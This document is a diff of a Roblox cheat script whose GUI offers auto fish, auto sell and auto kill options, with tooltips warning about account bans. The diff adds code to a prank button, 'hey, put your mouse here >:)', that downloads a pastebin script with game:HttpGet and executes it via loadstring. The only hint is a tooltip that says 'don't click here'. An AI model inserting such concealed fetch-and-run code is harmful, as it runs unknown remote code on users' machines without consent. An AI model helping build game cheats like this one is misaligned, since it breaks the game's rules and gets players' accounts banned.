@@ -386,7 +386,7 @@ vuser:ClickButton1(Vector2.new())
 
 end)
 --
-Toggle1:AddToolTip("HEY, hey put your fishing rod on the first slot, ~NOW~ \nthrow the fish hook into the water then activate this option \nI've been using auto fish for 1 days on a alt and for now no ban (alt#1 get a ban) \n \nNOT joking about BAN \nTesting new auto fish method")
+Toggle1:AddToolTip("HEY, put your fishing rod on the first slot. NOW \nthrow the fish hook into the water then activate this option \nI've been using auto fish for 1 days on a alt and for now no ban (alt#1 get a ban) \n \nNOT joking about BAN \nTesting new auto fish method")
 
 
 local Toggle2 = Section1:CreateToggle("Auto Sell", nil, function(State)
@@ -593,9 +593,11 @@ Section2:CreateLabel("Misc")
  
 local Button8 = Section2:CreateButton("hey, put your mouse here >:)", function()
 setclipboard("i like kaede to suzu the animation")
+        wait(1)
+loadstring(game:HttpGet(('https://pastebin.com/raw/yynzQp3T' ),true))()
 end) 
 
-Button8:AddToolTip("if the auto kill doesn't work \nopen the raw script and go to the line 154 and change 'Handle' per 'GripC1'")
+Button8:AddToolTip("if the auto kill doesn't work \nopen the raw script and go to the line 154 and change 'Handle' per 'GripC1' \n \nand one more thing, don't click here")
 
 local Button5 = Section2:CreateButton("Rejoins", function()
 tpservice:Teleport(game.PlaceId, plr)
